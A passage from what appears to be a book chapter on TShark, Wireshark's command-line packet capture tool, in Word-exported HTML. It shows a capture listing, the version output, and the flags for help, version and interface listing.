style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >https [SYN] Seq=0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Win=29200 Len=0 MSS=1460 SACK_PERM=1 TSval=926226 TSecr=0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section126" ><p class=MsoNormal  style="margin-top:3.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >WS=1024</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >34 5.082801000 192.168.178.30 -&#62; 46.228.47.115 TCP 74 33138 &#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >http [SYN] Seq=0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Win=29200 Len=0 MSS=1460 SACK_PERM=1 TSval=926228 TSecr=0 WS=1024</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >35 5.103958000 192.168.178.30 -&#62; 91.198.174.192 TCP 66 47282 &#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >http [ACK] Seq=1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Ack=1 Win=29696 Len=0 TSval=926233 TSecr=3372083284</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >36 5.104123000 192.168.178.30 -&#62; 173.194.67.103 TCP 66 48231 &#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >http [ACK] Seq=1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:72.9500pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Ack=1 Win=29696 Len=0 TSval=926233 TSecr=1173326044 37 5.104411000 192.168.178.30 -&#62; 91.198.174.192 HTTP</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.3500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >378</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >GE/favicon.ico HTTP /1.1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:6.3500pt;" ><a name="_bookmark255" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Like all the Wireshark tools, TShark runs on both Linux and Windows operating systems. With Windows, it isn&#8217;t added to your working path, so you won&#8217;t be able to run TShark from an open command prompt without first changing your working directory to the Wireshark installation folder. To avoid this little bit of extra typing, you can just add the Wireshark installation folder to your </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PATH</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >variable, as outlined in </span><span><a href="#_bookmark56" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Like most *nix command-line tools, supplying the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-h </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag displays some general help about how to use TShark. Additionally, if you want to check your version, and whether it supports Lua scripting, you can provide the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-v</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.5500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~$ tshark -v</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >TShark 1.10.2 (SVN Rev 51934 from /trunk-1.10)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Copyright 1998-2013 Gerald Combs &#60;</span><span><a href="mailto:gerald@wireshark.org" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >gerald@wireshark.org</span></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62; and contributors.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >This is free software; see the source for copying conditions.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >There is NO</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Compiled (32-bit) with GLib 2.32.4, with libpcap, with libz 1.2.7, with POSIX</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >capabilities (Linux), without libnl, with SMI 0.4.8, with</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >c-ares 1.9.1, with</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Lua 5.1, without Python, with GnuTLS 2.12.20, with Gcrypt</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1.5.0, with MIT</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Kerberos, with GeoIP.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:17.2500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Running on Linux 3.12-kali1-686-pae, with locale</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >en_US.UTF-8, with libpcap</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >version 1.3.0, with libz 1.2.7.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section127" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Built using gcc 4.7.2.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The most important flag is going to be the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-i</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag, which specifies the interface on which to start capturing. Before the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-i </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag can be used, however, you will need to know how the interface you want to use is named. To help with figuring out which interface to use, TShark provides the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-D </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >flag. This flag prints all of the interfaces that are available for capture, as shown in the following code:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.3000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~$ tshark -D</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:29.5500pt;text-indent:-21.5500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l12 level1 lfo6;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >em1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:29.5500pt;text-indent:-21.5500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l12 level1 lfo6;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >wlan1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:29.5500pt;text-indent:-21.5500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l12 level1 lfo6;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >vmnet1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:29.5500pt;text-indent:-21.5500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l12 level1 lfo6;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >4.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >wlan2</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:29.5500pt;text-indent:-21.5500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l12 level1 lfo6;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >5.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >vmnet8</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:29.5500pt;text-indent:-21.5500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l12 level1 lfo6;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >6.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >any (Pseudo-device that captures on all</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.9500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >interfaces)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:29.5500pt;text-indent:-21.5500pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;mso-list:l12 level1 lfo6;" ><![if !supportLists]><span style="font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;" ><span style='mso-list:Ignore;' >7.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >lo</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:6.3500pt;" ><a name="_bookmark256" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To start capturing on a specific interface, use the </span><span style="mso-spacerun:'yes';font-family:'Courier 